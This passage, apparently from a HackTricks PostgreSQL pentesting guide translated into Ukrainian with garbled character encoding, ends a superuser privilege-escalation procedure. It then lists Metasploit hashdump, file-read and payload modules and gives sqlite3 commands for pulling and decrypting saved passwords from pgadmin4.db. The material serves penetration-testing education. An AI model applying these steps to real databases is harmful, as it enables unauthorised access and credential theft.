6. –ü–æ–≤—Ç–æ—Ä–Ω–æ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –≤—ñ–¥—Ä–µ–¥–∞–≥–æ–≤–∞–Ω–∏–π —Ñ–∞–π–ª–æ–≤–∏–π –≤—É–∑–æ–ª —á–µ—Ä–µ–∑ —Ñ—É–Ω–∫—Ü—ñ—ó `lo_*` —ñ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏ –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–∏–π —Ñ–∞–π–ª –Ω–∞ –¥–∏—Å–∫—É
7. _(–û–ø—Ü—ñ–π–Ω–æ)_ –û—á–∏—Å—Ç–∏—Ç–∏ –∫–µ—à —Ç–∞–±–ª–∏—Ü—ñ –≤ –ø–∞–º'—è—Ç—ñ, –∑–∞–ø—É—Å—Ç–∏–≤—à–∏ –≤–∏—Ç—Ä–∞—Ç–Ω–∏–π SQL-–∑–∞–ø–∏—Ç
8. –¢–µ–ø–µ—Ä –≤–∏ –ø–æ–≤–∏–Ω–Ω—ñ –º–∞—Ç–∏ –ø—Ä–∏–≤—ñ–ª–µ—ó –ø–æ–≤–Ω–æ–≥–æ —Å—É–ø–µ—Ä –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞.

## **POST**
```
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> use auxiliary/scanner/postgres/postgres_schemadump
msf> use auxiliary/admin/postgres/postgres_readfile
msf> use exploit/linux/postgres/postgres_payload
msf> use exploit/windows/postgres/postgres_payload
```
### logging

–í—Å–µ—Ä–µ–¥–∏–Ω—ñ —Ñ–∞–π–ª—É _**postgresql.conf**_ –≤–∏ –º–æ–∂–µ—Ç–µ —É–≤—ñ–º–∫–Ω—É—Ç–∏ –∂—É—Ä–Ω–∞–ª–∏ postgresql, –∑–º—ñ–Ω–∏–≤—à–∏:
```bash
log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
```
–¢–æ–¥—ñ, **–ø–µ—Ä–µ–∑–∞–ø—É—Å—Ç—ñ—Ç—å —Å–µ—Ä–≤—ñ—Å**.

### pgadmin

[pgadmin](https://www.pgadmin.org) - —Ü–µ –ø–ª–∞—Ç—Ñ–æ—Ä–º–∞ –¥–ª—è –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä—É–≤–∞–Ω–Ω—è —Ç–∞ —Ä–æ–∑—Ä–æ–±–∫–∏ –¥–ª—è PostgreSQL.\
–í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ **–ø–∞—Ä–æ–ª—ñ** –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Ñ–∞–π–ª—É _**pgadmin4.db**_\
–í–∏ –º–æ–∂–µ—Ç–µ —Ä–æ–∑—à–∏—Ñ—Ä—É–≤–∞—Ç–∏ —ó—Ö, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Ñ—É–Ω–∫—Ü—ñ—é _**decrypt**_ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Å–∫—Ä–∏–ø—Ç–∞: [https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py)
```bash
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
```
### pg\_hba

–ê—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—è –∫–ª—ñ—î–Ω—Ç—ñ–≤ —É PostgreSQL –∫–µ—Ä—É—î—Ç—å—Å—è —á–µ—Ä–µ–∑ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π–Ω–∏–π —Ñ–∞–π–ª –ø—ñ–¥ –Ω–∞–∑–≤–æ—é **pg\_hba.conf**. –¶–µ–π —Ñ–∞–π–ª –º—ñ—Å—Ç–∏—Ç—å —Å–µ—Ä—ñ—é –∑–∞–ø–∏—Å—ñ–≤, –∫–æ–∂–µ–Ω –∑ —è–∫–∏—Ö –≤–∫–∞–∑—É—î —Ç–∏–ø –∑'—î–¥–Ω–∞–Ω–Ω—è, –¥—ñ–∞–ø–∞–∑–æ–Ω IP-–∞–¥—Ä–µ—Å –∫–ª—ñ—î–Ω—Ç—ñ–≤ (—è–∫—â–æ –∑–∞—Å—Ç–æ—Å–æ–≤–Ω–æ), –Ω–∞–∑–≤—É –±–∞–∑–∏ –¥–∞–Ω–∏—Ö, —ñ–º'—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ —Ç–∞ –º–µ—Ç–æ–¥ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó, —è–∫–∏–π —Å–ª—ñ–¥ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥–ª—è –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–æ—Å—Ç—ñ –∑'—î–¥–Ω–∞–Ω–Ω—è–º. –ü–µ—Ä—à–∏–π –∑–∞–ø–∏—Å, —è–∫–∏–π –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—î —Ç–∏–ø—É –∑'—î–¥–Ω–∞–Ω–Ω—è, –∞–¥—Ä–µ—Å—ñ –∫–ª—ñ—î–Ω—Ç–∞, –∑–∞–ø–∏—Ç—É–≤–∞–Ω—ñ–π –±–∞–∑—ñ –¥–∞–Ω–∏—Ö —Ç–∞ —ñ–º–µ–Ω—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó. –ù–µ–º–∞—î —Ä–µ–∑–µ—Ä–≤–Ω–æ–≥–æ –≤–∞—Ä—ñ–∞–Ω—Ç—É, —è–∫—â–æ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—è –Ω–µ –≤–¥–∞–ª–∞—Å—è. –Ø–∫—â–æ –∂–æ–¥–µ–Ω –∑–∞–ø–∏—Å –Ω–µ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—î, –¥–æ—Å—Ç—É–ø –∑–∞–±–æ—Ä–æ–Ω–µ–Ω–æ.

–î–æ—Å—Ç—É–ø–Ω—ñ –º–µ—Ç–æ–¥–∏ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –Ω–∞ –æ—Å–Ω–æ–≤—ñ –ø–∞—Ä–æ–ª—ñ–≤ —É pg\_hba.conf - —Ü–µ **md5**, **crypt** —Ç–∞ **password**. –¶—ñ –º–µ—Ç–æ–¥–∏ –≤—ñ–¥—Ä—ñ–∑–Ω—è—é—Ç—å—Å—è —Ç–∏–º, —è–∫ –ø–µ—Ä–µ–¥–∞—î—Ç—å—Å—è –ø–∞—Ä–æ–ª—å: MD5-—Ö–µ—à–æ–≤–∞–Ω–∏–π, crypt-–∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–π –∞–±–æ —É –≤—ñ–¥–∫—Ä–∏—Ç–æ–º—É —Ç–µ–∫—Å—Ç—ñ. –í–∞–∂–ª–∏–≤–æ –∑–∞–∑–Ω–∞—á–∏—Ç–∏, —â–æ –º–µ—Ç–æ–¥ crypt –Ω–µ –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏–π –∑ –ø–∞—Ä–æ–ª—è–º–∏, —è–∫—ñ –±—É–ª–∏ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω—ñ –≤ pg\_authid.

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=pentesting-postgresql) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=pentesting-postgresql" %}
